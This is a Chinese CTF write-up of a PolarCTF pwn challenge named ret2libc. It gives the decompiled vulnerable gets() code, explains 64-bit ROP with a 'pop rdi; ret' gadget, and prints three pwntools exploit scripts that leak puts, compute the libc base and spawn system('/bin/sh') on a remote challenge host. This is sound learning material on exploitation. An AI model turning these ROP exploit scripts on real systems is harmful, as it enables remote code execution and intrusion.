---
title: "PolarCTF-Pwn（困难）刷题WP"
date: 2024-12-14 22:34:00
categories:
  - "CTF Writeup"
tags:
  - "CTF"
  - "Writeup"
  - "PolarCTF"
  - "Pwn"
cnblogs_postid: "18607366"
cnblogs_url: "https://www.cnblogs.com/ljnljn/p/18607366"
---

# 1、ret2libc
前期准备：
![image](/assets/cnblogs/PolarCTF-Pwn（困难）刷题WP/3539156-20241214223129186-1690706569.png)

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[112]; // [rsp+0h] [rbp-70h] BYREF

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  gets(s);
  puts(s);
  return 0;
}
```
>  因为程序是动态链接的，可以利用`gets()`函数的溢出来泄露`puts()`函数的实际地址，利用`puts()`函数的实际地址计算出libc基地址，再计算`system()`函数和`/bin/sh`字符串的地址。这样就可以构造`system('/bin/sh')`了。
>
> 1. 第一次输入构造`puts()`用来泄露`puts()`函数的地址，这里返回地址要设置成`main()`来提供第二次输入；
> 2. 根据泄露出的地址来寻找对应的libc库，并计算libc基址、`system()`函数和`/bin/sh`字符串的地址；
> 3. 构造栈结构，进行栈溢出；
> 4. getshell。

没查到binsh，因此典型构造system和binsh

> 这里需要注意，64位程序和32位程序有比较大的区别，32位程序函数参数是通过栈来传参，只需要构造一个栈结构即可；64位程序函数参数是通过寄存器来传参，因此，需要用到ROPgadget来给寄存器赋值。
>
> 64位程序传递参数的寄存器一共有六个，如果函数参数大于六个，后面的参数才会入栈，寄存器传参顺序为：`$rdi $rsi $rdx $rcx $r8 $r9`。
>
> 因为本题需要用到的函数为`puts()`和`system()`，这两个函数都只有一个参数，所以只需要rdi寄存器，即`pop rdi ; ret`。
>
> 构造函数的顺序为：溢出偏移 + pop rdi ; ret + 参数 + 函数地址 + 函数返回地址.
>
> **注：这里因为程序只有一次输入输出，所以返回地址要填上main函数的地址，当构造的函数执行完后，会返回到main函数，提供第二次输入。**

![image](/assets/cnblogs/PolarCTF-Pwn（困难）刷题WP/3539156-20241214223157541-78809850.png)

(为了防偏移多找了一个ret)

## 最初exp（有问题）

```Python
from pwn import *
from LibcSearcher import *

offset=0x70+8
rdi_addr = 0x400753
ret_addr = 0x400509
#io = process('./ret2libc')
io = remote('1.95.36.136', 2089)
elf = ELF('./ret2libc')

context(arch='amd64', os='linux', log_level='debug')

got_addr = elf.got['puts']
plt_addr = elf.plt['puts']
main_addr = elf.symbols['main']

payload = b'a' * offset + p64(rdi_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)
io.sendline(payload)

puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
print(hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
sys_addr = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')

payload = b'a' * offset + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)

sleep(1)
io.sendline(payload)
io.interactive()
```

运行的结果

![image](/assets/cnblogs/PolarCTF-Pwn（困难）刷题WP/3539156-20241214223211697-26050821.png)

感觉打通了又感觉没打通o(╥﹏╥)o

## 官方的exp

根本运行不了（python2、3都不行）

```python
from pwn import *

r = process('./ret2libc')
libc = ELF('./libc.so')
elf = ELF('./ret2libc')

padding = 120

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = 0x400666
pop_rdi_ret = 0x0400753


payload = 'a' * padding
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)


r.sendline(payload)


r.recvline()
#puts_real = u64(r.recvline()[:-1].ljust(8,'\x00'))官方这里用不了
puts_real = u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
print hex(puts_real)


libc_base = puts_real - libc.symbols['puts']
print hex(libc_base)
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + libc.search('/bin/sh').next()


payload2 = 'a' * padding
payload2 += p64(pop_rdi_ret)
payload2 += p64(bin_sh_addr)
payload2 += p64(system_addr)
payload2 += p64(0xdeadbeef)#看不懂，解释在下面

sleep(1)
r.sendline(payload2)

r.interactive()
```

![image](/assets/cnblogs/PolarCTF-Pwn（困难）刷题WP/3539156-20241214223222851-55790104.png)


（谢谢Sevedy佬!ღ( ´･ᴗ･` )，大家快去加他blog：https://www.cnblogs.com/Sevedy)

后面佬很强，检查发现是binsh的偏移有问题，导致system打通了但是无法执行命令

关键在于libcsearcher找不到对应的libc库，于是这里要上网站找 https://libc.blukat.me/

![image](/assets/cnblogs/PolarCTF-Pwn（困难）刷题WP/3539156-20241214223257354-1202319755.png)

（官方的libc库也是个错的，不知道他怎么做出来的呃呃呃）

## 最终exp

```python
from pwn import *

#r = process('./ret2libc')
r=remote('1.95.36.136', 2121)
libc = ELF('./libc6_2.23-0ubuntu11.3_amd64.so')
elf = ELF('./ret2libc')

padding = 120

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = 0x400666
pop_rdi_ret = 0x0400753

payload = b'a' * padding
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)
#这里因为程序只有一次输入输出，所以返回地址要填上main函数的地址，当构造的函数执行完后，会返回到main函数，提供第二次输入。
r.sendline(payload)

r.recvline()#接受输出
puts_real = u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))#接受实际数据，u64用来解包
print (hex(puts_real))

libc_base = puts_real - libc.symbols['puts']
print (hex(libc_base))
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search('/bin/sh'))

payload2 = b'a' * padding
payload2 += p64(pop_rdi_ret)
payload2 += p64(bin_sh_addr)
payload2 += p64(system_addr)
payload2 += p64(0xdeadbeef)

sleep(1)
r.sendline(payload2)

r.interactive()
```

![image](/assets/cnblogs/PolarCTF-Pwn（困难）刷题WP/3539156-20241214223314753-470193508.png)


## 反思

1、libcsearcher找不到的库要上网站多试几个libc库

2、本地写libc还是不熟练，需要总结更多的模版

3、```bin_sh_addr = libc_base + next(libc.search('/bin/sh'))```这里的next写法已经更新了
